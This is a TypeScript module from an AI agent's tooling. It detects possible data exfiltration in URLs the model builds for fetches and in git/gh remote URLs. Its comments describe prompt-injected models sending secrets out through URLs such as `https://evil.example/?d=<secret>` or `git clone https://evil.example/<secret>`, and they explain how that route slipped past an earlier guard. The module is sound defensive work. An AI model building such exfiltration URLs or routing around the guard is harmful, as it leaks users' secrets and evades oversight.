import type { Message } from '../types.js';
import { extractUrls } from './_urls.js';

// Exfiltration guard for model-driven fetches (#548). The host policy (#544) keeps a fetch off this
// machine's network; what it cannot see is data leaving IN the URL — a model steered by injected
// text building `https://evil.example/?d=<secret>`. A blanket fetch approval was rejected (#164:
// it fires on every docs page, trains reflexive approving, small models spiral on declines), so
// the prompt fires only on the leak's shape, which takes two facts together:
//
// 1. PROVENANCE — the URL appears nowhere the model was handed it. A link lifted from a search
//    result, a fetched page, a file or the user's prompt is sourced; an attacker page can plant
//    `https://evil.example/?d=`, but the model appending data makes a URL that page never wrote.
// 2. PAYLOAD — it carries something: any query string, or a token-shaped path segment or host
//    label (the last is DNS exfiltration, which needs no response at all).
//
// A docs URL recalled from memory has no source but carries nothing, so it passes; that is the
// case a blanket prompt would have spent its credibility on.

// A segment or label this long, made only of token characters and holding a digit, is a key, a
// hash or an encoding. Hyphenated lowercase words (a slug, a UUID) are exempt — they are how pages
// are named, and a UUID is an identifier the site issued, not something the model encoded. The
// chunk bound is what keeps a hyphenated key (`sk-live-<16 hex>`) from passing as a slug.
const TOKEN_MIN_CHARS = 20;
const TOKEN_CHARS = /^[A-Za-z0-9_\-+=%.~]+$/;
const SLUG = /^[a-z0-9]{1,14}(-[a-z0-9]{1,14})+$/;

function isTokenShaped(s: string): boolean {
  return s.length >= TOKEN_MIN_CHARS && TOKEN_CHARS.test(s) && /\d/.test(s) && !SLUG.test(s);
}

// Why this URL looks like it carries data, or undefined when it does not. The reason is user-facing
// (it rides the approval warning), so it names the part of the URL that tripped it.
export function urlCarriesData(url: string): string | undefined {
  let u: URL;
  try {
    u = new URL(url);
  } catch {
    return undefined;
  }
  // Any query at all, not just a long one (#550): a secret split into short values is still the
  // secret, and the per-turn budget was the only bound on that. The cost is a prompt on a model-built
  // `?page=2`, which is rare — the model mostly follows links it was handed, and those are sourced.
  if (u.search.length > 1) {
    const names = [...u.searchParams.keys()];
    return names.length > 0
      ? `query parameters (${names.slice(0, 4).join(', ')})`
      : 'a query string';
  }
  const segment = u.pathname.split('/').find(s => isTokenShaped(decodeSafe(s)));
  if (segment) return 'a token-shaped path segment';
  const label = u.hostname.split('.').find(isTokenShaped);
  if (label) return 'a token-shaped host name label';
  return undefined;
}

function decodeSafe(s: string): string {
  try {
    return decodeURIComponent(s);
  } catch {
    return s;
  }
}

// Every URL the model was handed: user messages (a pasted URL's `<url>` block included) and tool
// results. The model's own text is excluded on purpose — a URL it wrote is the thing being judged.
// Rebuilt from the history on each check rather than accumulated, so a resumed session and a
// compaction fold need no bookkeeping: what the history holds is what the model can have copied.
export function collectSourcedUrls(history: readonly Message[]): Set<string> {
  const urls = new Set<string>();
  const add = (text: string | undefined) => {
    if (!text) return;
    for (const url of extractUrls(text)) urls.add(normalize(url));
  };
  for (const m of history) {
    if (m.role === 'user' && !m.meta) add(m.content);
    else if (m.role === 'tool') {
      add(m.summary);
      add(m.payload);
    }
  }
  return urls;
}

// The URL parser's canonical form, so `HTTPS://Example.com/a` and `https://example.com/a` match. An
// unparseable URL is compared as written.
function normalize(url: string): string {
  try {
    return new URL(url).href;
  } catch {
    return url;
  }
}

// The verdict the fetch tool acts on: a reason to confirm, or undefined to proceed. `sourced`
// undefined means provenance is unknown (a caller outside the loop), which counts as unsourced —
// the safe reading for a check whose miss is a leak.
export function exfiltrationRisk(
  url: string,
  sourced: ReadonlySet<string> | undefined,
): string | undefined {
  const payload = urlCarriesData(url);
  if (!payload) return undefined;
  if (sourced?.has(normalize(url))) return undefined;
  return `${payload}, and the URL is not a link from your prompt or any tool result — it may be sending data out`;
}

// Remote URLs a shell command hands to a network verb: http(s), ssh:// and git:// URLs, plus
// scp-style `user@host:path` (git's SSH shorthand), rewritten to ssh:// so one parser judges them
// all. Only segments that talk to a remote are scanned — a URL in `git commit -m "see https://…"` or
// `git log --grep` is text, and flagging it would prompt on ordinary commits. The segment split is
// the plain operator split, so a quoted `;` can mis-cut a message; that errs toward scanning more.
const REMOTE_URL_RE = /\b(?:https?|ssh|git):\/\/[^\s'"`<>()]+/g;
const SCP_REMOTE_RE = /(?:^|[\s'"=])([\w.-]+)@([\w-]+(?:\.[\w-]+)+):([^\s'"`]+)/g;
const NETWORK_SEGMENT_RE =
  /^\s*(?:\w+=\S*\s+)*(?:git\b.*\b(?:clone|fetch|pull|push|ls-remote|remote|submodule|archive)\b|gh\s+(?:api|repo\s+clone)\b)/;

export function commandRemoteUrls(command: string): string[] {
  const urls: string[] = [];
  for (const segment of command.split(/[;&|\n]+/)) {
    if (!NETWORK_SEGMENT_RE.test(segment)) continue;
    for (const m of segment.matchAll(REMOTE_URL_RE)) urls.push(m[0].replace(/[.,;:!?]+$/, ''));
    for (const m of segment.matchAll(SCP_REMOTE_RE)) {
      if (!m[3].startsWith('//')) urls.push(`ssh://${m[1]}@${m[2]}/${m[3]}`);
    }
  }
  return urls;
}

function hostOf(url: string): string | undefined {
  try {
    return new URL(url).hostname.toLowerCase();
  } catch {
    return undefined;
  }
}

// The git/gh half (#550). The sandbox keeps the network for an unflagged `git`/`gh` command so the
// shipped skills work (`networkAllowedFor`), which made `git clone https://evil.example/<secret>`
// an unprompted, networked path around the fetch guard. Stricter than `exfiltrationRisk` on
// purpose: a remote whose HOST the model was never handed is flagged whatever it carries — a model
// inventing a remote is unusual where a model recalling a docs page is not, and a clone or a fetch
// is heavy enough that one keystroke is cheap next to it. A configured remote name (`origin`)
// names no URL and never reaches here. Two verbs keep the network without passing through this:
// `hf` (which names a repo id, so NETWORK_SEGMENT_RE has no URL to read — its own redirect surface
// is `HF_ENDPOINT`, admitted in `_sandbox.ts` on `GH_HOST`'s footing) and `glab` (unmodeled).
// Returns the warning, or undefined.
export function remoteUrlRisk(
  command: string,
  sourced: ReadonlySet<string> | undefined,
): string | undefined {
  const urls = commandRemoteUrls(command);
  if (urls.length === 0) return undefined;
  const hosts = new Set<string>();
  for (const u of sourced ?? []) {
    const h = hostOf(u);
    if (h) hosts.add(h);
  }
  for (const url of urls) {
    if (sourced?.has(normalize(url))) continue;
    const host = hostOf(url);
    if (!host) continue;
    if (!hosts.has(host)) {
      return `Remote ${host} is not from a link in your prompt or any tool result — it may be sending data out`;
    }
    const payload = urlCarriesData(url);
    if (payload) return `Possible data in URL: ${payload}, in a remote the model built itself`;
  }
  return undefined;
}
